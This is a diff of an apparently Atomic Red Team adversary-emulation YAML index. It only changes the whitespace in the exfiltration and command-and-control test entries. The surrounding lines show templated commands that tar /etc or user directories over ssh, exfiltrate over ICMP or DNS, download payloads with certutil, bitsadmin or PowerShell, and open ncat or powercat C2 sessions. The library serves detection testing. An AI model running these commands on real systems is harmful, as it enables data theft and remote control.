       description: 'Take a file/directory, split it into 5Mb chunks
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -28266,7 +28266,7 @@ exfiltration:
         elevation_required: false
         command: 'ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
 
-'
+          '
     - name: Exfiltration Over Alternative Protocol - SSH
       description: |
         Input a domain and test Exfiltration over SSH
@@ -28296,7 +28296,7 @@ exfiltration:
         command: 'tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh
           #{user_name}@#{domain} ''cat > /Users.tar.gz.enc''
 
-'
+          '
     - name: Exfiltration Over Alternative Protocol - HTTP
       description: |
         A firewall rule (iptables or firewalld) will be needed to allow exfiltration on port 1337.
@@ -28344,11 +28344,11 @@ exfiltration:
           in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send("#{ip_address}",
           1500, $Data) }
 
-'
+          '
     - name: Exfiltration Over Alternative Protocol - DNS
       description: 'Exfiltration of specified file over DNS protocol.
 
-'
+        '
       supported_platforms:
       - linux
       executor:
@@ -28494,7 +28494,7 @@ command-and-control:
         name: sh
         command: 'export #{proxy_scheme}_proxy=#{proxy_server}
 
-'
+          '
         cleanup_command: |
           unset http_proxy
           unset https_proxy
@@ -28590,7 +28590,7 @@ command-and-control:
     - name: Base64 Encoded data.
       description: 'Utilizing a common technique for posting base64 encoded data.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -28671,7 +28671,7 @@ command-and-control:
         and using this to maintain access to the machine. Download of TeamViewer installer
         will be at the destination location when sucessfully executed.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -28731,7 +28731,7 @@ command-and-control:
     - name: rsync remote file copy (push)
       description: 'Utilize rsync to perform a remote file copy (push)
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -28756,11 +28756,11 @@ command-and-control:
         name: bash
         command: 'rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}
 
-'
+          '
     - name: rsync remote file copy (pull)
       description: 'Utilize rsync to perform a remote file copy (pull)
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -28785,11 +28785,11 @@ command-and-control:
         name: bash
         command: 'rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}
 
-'
+          '
     - name: scp remote file copy (push)
       description: 'Utilize scp to perform a remote file copy (push)
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -28814,11 +28814,11 @@ command-and-control:
         name: bash
         command: 'scp #{local_file} #{username}@#{remote_host}:#{remote_path}
 
-'
+          '
     - name: scp remote file copy (pull)
       description: 'Utilize scp to perform a remote file copy (pull)
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -28843,11 +28843,11 @@ command-and-control:
         name: bash
         command: 'scp #{username}@#{remote_host}:#{remote_file} #{local_path}
 
-'
+          '
     - name: sftp remote file copy (push)
       description: 'Utilize sftp to perform a remote file copy (push)
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -28872,11 +28872,11 @@ command-and-control:
         name: bash
         command: 'sftp #{username}@#{remote_host}:#{remote_path} <<< $''put #{local_file}''
 
-'
+          '
     - name: sftp remote file copy (pull)
       description: 'Utilize sftp to perform a remote file copy (pull)
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -28901,12 +28901,12 @@ command-and-control:
         name: bash
         command: 'sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
 
-'
+          '
     - name: certutil download (urlcache)
       description: 'Use certutil -urlcache argument to download a file from the web.
         Note - /urlcache also works!
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -28923,12 +28923,12 @@ command-and-control:
         elevation_required: false
         command: 'cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
 
-'
+          '
     - name: certutil download (verifyctl)
       description: 'Use certutil -verifyctl argument to download a file from the web.
         Note - /verifyctl also works!
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -28973,7 +28973,7 @@ command-and-control:
         command: 'C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority
           HIGH #{remote_file} #{local_path}
 
-'
+          '
     - name: Windows - PowerShell Download
       description: |
         This test uses PowerShell to download a payload.
@@ -28994,15 +28994,15 @@ command-and-control:
         command: '(New-Object System.Net.WebClient).DownloadFile("#{remote_file}",
           "#{destination_path}")
 
-'
+          '
         cleanup_command: 'Remove-Item #{destination_path} -Force -ErrorAction Ignore
 
-'
+          '
     - name: OSTAP Worming Activity
       description: 'OSTap copies itself in a specfic way to shares and secondary drives.
         This emulates the activity.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -29151,7 +29151,7 @@ command-and-control:
           "#{query_type}" "#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}"
           -QuickTimeout}
 
-'
+          '
     - name: DNS Regular Beaconing
       description: |
         This test simulates an infected host beaconing via DNS queries to a command and control server at regular intervals over time.
@@ -29243,7 +29243,7 @@ command-and-control:
     - name: OSTap Payload Download
       description: 'Uses cscript //E:jscript to download a file
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -29263,7 +29263,7 @@ command-and-control:
           cscript //E:Jscript #{script_file}
         cleanup_command: 'del #{script_file} /F /Q >nul 2>&1
 
-'
+          '
   T1032:
     technique:
       x_mitre_data_sources:
@@ -29476,7 +29476,7 @@ command-and-control:
         elevation_required: false
         command: 'cmd /c #{ncat_exe} #{server_ip} #{server_port}
 
-'
+          '
     - name: Powercat C2
       description: "Start C2 Session Using Powercat\nTo start the listener on a Linux
         device, type the following: \nnc -l -p <port>\n"
@@ -29541,7 +29541,7 @@ command-and-control:
     - name: Testing usage of uncommonly used port with PowerShell
       description: 'Testing uncommonly used port utilizing PowerShell
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -29558,11 +29558,11 @@ command-and-control:
         elevation_required: false
         command: 'test-netconnection -ComputerName #{domain} -port #{port}
 
-'
+          '
     - name: Testing usage of uncommonly used port
       description: 'Testing uncommonly used port utilizing telnet.
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -29580,7 +29580,7 @@ command-and-control:
         elevation_required: false
         command: 'telnet #{domain} #{port}
 
-'
+          '
   T1102:
     technique:
       x_mitre_permissions_required:
@@ -29647,7 +29647,7 @@ command-and-control:
     - name: Reach out to C2 Pointer URLs via command_prompt
       description: 'Download data from a public website using command line
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -29656,14 +29656,14 @@ command-and-control:
         command: 'bitsadmin.exe /transfer "DonwloadFile" http://www.stealmylogin.com/
           %TEMP%\bitsadmindownload.html
 
-'
+          '
         cleanup_command: 'del %TEMP%\bitsadmindownload.html >nul 2>&1
 
-'
+          '
     - name: Reach out to C2 Pointer URLs via powershell
       description: 'Multiple download methods for files using powershell
 
-'
+        '
       supported_platforms:
       - windows
       executor:
